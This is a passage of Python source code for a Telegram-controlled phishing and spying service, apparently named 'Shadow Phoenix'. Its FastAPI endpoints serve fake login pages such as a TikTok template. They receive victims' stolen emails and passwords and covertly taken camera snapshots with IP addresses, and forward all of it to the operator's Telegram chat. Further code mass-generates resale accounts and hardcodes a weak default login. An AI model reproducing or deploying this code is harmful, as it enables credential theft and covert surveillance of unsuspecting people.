    bot.send_message(chat_id, "⏳ جاري توليد 100 مستخدم جديد...")

    conn = get_db_connection()
    cursor = conn.cursor()
    users_list = []
    
    prefixes = ["hacker", "shadow", "phoenix", "ghost", "cyber", "agent", "knight", "wolf", "eagle", "tiger", "elite", "dark", "storm"]
    
    for i in range(100):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices(string.digits, k=4))
        username = f"{prefix}_{suffix}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        hashed = hash_password(password)
        
        try:
            cursor.execute("INSERT OR IGNORE INTO bot_users (username, password_hash) VALUES (?, ?)", (username, hashed))
            users_list.append(f"{username} | {password}")
        except Exception as e:
            logger.error(f"فشل إضافة {username}: {e}")
    
    conn.commit()
    conn.close()

    file_content = "👤 اسم المستخدم  |  🔑 كلمة السر\n"
    file_content += "=" * 40 + "\n"
    file_content += "\n".join(users_list)
    file_content += f"\n\n✅ إجمالي المستخدمين المضافة: {len(users_list)}"

    file_bytes = io.BytesIO(file_content.encode('utf-8'))
    file_bytes.name = "users_list.txt"
    bot.send_document(chat_id, file_bytes, caption="📁 قائمة الـ 100 مستخدم الجدد. وزّعها كما تشاء.")
    logger.info(f"✅ تم إرسال قائمة 100 مستخدم للمالك {chat_id}")

# ==================== نقاط API ====================
@app.get("/", response_class=HTMLResponse)
async def get_home(request: Request):
    template = request.query_params.get("template", "tiktok")
    return get_html_content(template, CAPTURE_SECRET)

@app.get("/login-page", response_class=HTMLResponse)
async def login_page():
    return get_login_html()

@app.post("/api/web-login")
async def api_web_login(data: LoginData):
    logger.info(f"🔐 محاولة تسجيل دخول: {data.username}")
    if try_login_user(data.chat_id, data.username, data.password):
        bot.send_message(data.chat_id, "✅ تم تسجيل الدخول.")
        show_main_menu(data.chat_id)
        return {"status": "success"}
    return {"status": "error", "message": "بيانات غير صحيحة"}

@app.post("/api/capture")
async def capture_api(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.json()
        if body.get("secret") != CAPTURE_SECRET:
            raise HTTPException(status_code=403, detail="Unauthorized")
        user_id = body.get("user_id")
        image_b64 = body.get("image")
        shot_count = body.get("count", 1)
        device_info = body.get("device", "غير معروف")
        
        client_ip = request.client.host
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            client_ip = forwarded.split(",")[0].strip()
        
        if not user_id or not image_b64:
            return JSONResponse(status_code=400, content={"status": "error"})
        
        log_capture(int(user_id), client_ip, device_info, shot_count)
        header, encoded = image_b64.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        image_file = io.BytesIO(image_bytes)
        image_file.name = f"capture_{shot_count}.jpg"
        background_tasks.add_task(bot.send_photo, chat_id=int(user_id), photo=image_file,
                                  caption=f"📸 لقطة {shot_count}\nجهاز: {device_info}\nآيبي: {client_ip}")
        return {"status": "success"}
    except Exception as e:
        logger.error(f"Capture error: {e}")
        return JSONResponse(status_code=500, content={"status": "error"})

@app.post("/api/credentials")
async def credentials_api(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.json()
        if body.get("secret") != CAPTURE_SECRET:
            raise HTTPException(status_code=403, detail="Unauthorized")
        user_id = body.get("user_id")
        email = body.get("email")
        password = body.get("password")
        login_type = body.get("login_type", "unknown")
        
        client_ip = request.client.host
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            client_ip = forwarded.split(",")[0].strip()
        
        if not user_id or not email or not password:
            return JSONResponse(status_code=400, content={"status": "error"})
        
        log_credentials(int(user_id), login_type, email, password, client_ip)
        background_tasks.add_task(
            bot.send_message,
            chat_id=int(user_id),
            text=f"🔑 **تم صيد بيانات:**\nالنوع: {login_type.upper()}\nالبريد: `{email}`\nكلمة المرور: `{password}`\nآيبي: `{client_ip}`",
            parse_mode="Markdown"
        )
        return {"status": "success"}
    except Exception as e:
        logger.error(f"Credentials error: {e}")
        return JSONResponse(status_code=500, content={"status": "error"})

@app.post(f"/{BOT_TOKEN}")
async def webhook(request: Request):
    try:
        json_string = await request.body()
        update = telebot.types.Update.de_json(json_string.decode('utf-8'))
        bot.process_new_updates([update])
        return {"status": "ok"}
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {"status": "error"}

@app.on_event("startup")
def startup():
    try:
        bot.remove_webhook()
        webhook_url = f"{RENDER_URL}/{BOT_TOKEN}"
        bot.set_webhook(url=webhook_url)
        logger.info(f"🚀 Webhook مضبوط على: {webhook_url}")
    except Exception as e:
        logger.error(f"⚠️ فشل ضبط Webhook: {e}")
    
    create_new_account("moosa", "123456")
    logger.info("🔥 Shadow Phoenix v11.0 جاهز للعمل مع أمر /genusers!")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
